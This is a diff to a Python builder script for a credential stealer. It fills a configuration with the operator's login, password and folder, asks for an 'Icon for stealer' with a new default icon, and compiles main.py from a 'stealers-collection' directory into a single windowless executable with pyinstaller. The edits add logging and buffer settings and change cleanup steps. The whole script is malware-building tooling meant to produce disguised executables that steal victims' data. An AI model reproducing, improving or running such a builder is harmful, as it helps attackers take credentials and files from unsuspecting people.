@@ -57,6 +57,8 @@ with open("config.tmp.py", "r") as rf:
 			LOGIN=login,
 			PASSWORD=password,
 			FOLDER=folder,
+			LOG_LEVEL=0,
+			BUFFER_SIZE=1024
 		))
 print()
 print()
@@ -66,7 +68,10 @@ outfile = os.path.abspath(os.path.basename(input("Output file: ")))
 outfolder, outfile = os.path.split(outfile)
 if outfile.endswith(".exe"):
 	outfile = outfile[:-4]
-icon = os.path.abspath(os.path.basename(long_input("Icon for stealer: ", lambda x: os.path.exists(os.path.abspath(os.path.basename(x))))))
+icon = long_input("Icon for stealer ( default.icon ): ", lambda x: x == "" or os.path.exists(os.path.abspath(os.path.basename(x))))
+if not icon:
+	icon = "default.ico"
+icon = os.path.abspath(os.path.basename(icon))
 os.chdir("stealers-collection")
 print()
 print()
@@ -74,10 +79,6 @@ print(" Building stealer with pyinstaller:")
 os.system(f"pyinstaller -w -i \"{icon}\" -F --clean -y --distpath \"{outfolder}\" -n \"{outfile}\" main.py")
 try:
 	os.remove(f"{outfile}.spec")
-except:
-	pass
-try:
-	shutil.rmtree("__pycache__")
 except:
 	pass
 try:
